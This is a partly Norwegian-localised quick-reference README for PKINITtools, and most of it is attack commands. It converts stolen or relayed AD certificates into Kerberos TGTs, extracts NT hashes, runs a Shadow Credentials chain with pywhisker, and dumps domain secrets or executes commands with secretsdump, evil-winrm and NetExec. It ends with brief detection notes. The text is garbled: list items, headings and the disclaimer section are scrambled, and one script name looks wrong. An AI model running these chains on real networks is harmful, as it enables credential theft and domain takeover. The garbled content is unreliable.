# 🎫 PKINITtools – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)



```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```

<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="License MIT">
</p>

<p align="center">
  <b>🌐 Tools for Kerberos Public Key Cryptography for Initial Authentication (PKINIT), converting certificates to TGT tickets and recovering NT hashes</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Introduksjon](#-overview--the-pkinit-architecture)
- [Key Utilities: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Installasjon](#-installation)
- [Converting AD CS Certificates to Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Using a PFX File](#using-a-pfx-file)
  - [When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:](#using-base64-encoded-pfx-relay-chains)
- [Recovering NT Hashes (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
- [Consuming the TGT with Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
- [Hurtigreferanse](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Introduksjon

**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, defined in **RFC 4556**) is an extension to the Kerberos protocol. Instead of requiring a user's secret password hash (NTLM or AES) to request a Kerberos Ticket Granting Ticket (TGT), PKINIT allows a client to prove identity using **X.509 digital certificates and private/public key pairs**.

Created by renowned Active Directory researcher **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** provides the essential Python primitives to:
1. Authenticate to Active Directory Domain Controllers via PKINIT using extracted or relayed digital certificates.
🎯 Introduksjon
3. Recover the cleartext **NTLM Hash** of the account via the **UnPAC-the-Hash** mechanism.

---

## 🧰 Key Utilities: `gettgtpkinit.py` & `getskeyhash.py`

- **`gettgtpkinit.py`**: Communicates with the KDC (Kerberos Key Distribution Center) over port 88, presents the certificate, and requests an armored TGT, saving it as a Kirbi or ccache file.
- **`getskeyhash.py`**: Interrogates the Kerberos PAC (Privilege Attribute Certificate) returned in the PKINIT ticket to calculate and expose the account's static NT hash.

---

## 📥 Installasjon

```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```

---

## 🎫 Converting AD CS Certificates to Kerberos TGT

When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:

### Using a PFX File

```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```

### When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:

Using a PFX File

```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```

---

## 🔑 Recovering NT Hashes (UnPAC-the-Hash)

When an account authenticates with PKINIT, the Domain Controller signs the PAC with a PAC_CREDENTIAL_INFO structure containing the account's static **NTLM hash** (encrypted with a temporary AS-REP key). `getskeyhash.py` decrypts this structure:

```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

🔑 Recovering NT Hashes (UnPAC-the-Hash)

---

## 👥 Shadow Credentials Attack Workflow

With the NT hash in hand, you can immediately perform **Pass-the-Hash** or offline cracking!

```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```

---

## 🚀 Consuming the TGT with Impacket & NetExec

Once `gettgtpkinit.py` outputs a `.ccache` ticket, export it to the environment:

```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```

---

## ⚡ Hurtigreferanse

|Objective|Kommando|
|-----------|---------|
|**TGT via PFX File**|`gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>`|
|**TGT via Base64 Cert**|`gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>`|
|**Specify Domain Controller**|`gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>`|
|**UnPAC-the-Hash (Get NTLM)**|`getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>`|
|**Pass TGT to Impacket**|`export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>`|
|**Pass TGT to NetExec**|`export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass`|

---

## 🛡️ Defensive Considerations & Detection

1. **Event ID 4768 (TGT Request):** Active Directory logs Kerberos TGT requests. When PKINIT is used, the **Pre-Authentication Type** field shows `16` (PKINIT), rather than `2` (PA-ENC-TIMESTAMP).
2. **Auditing `msDS-KeyCredentialLink` Modifications:** Event ID 5136 records directory object modifications. Alert when key credentials are appended to non-Azure/Intune managed accounts.

---

## ⚠️ Legal Disclaimer

3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
> PKINITtools is intended for authorized Active Directory security auditing, Red Team operations, and educational research only. Manipulating corporate Kerberos tickets without explicit permission is illegal.
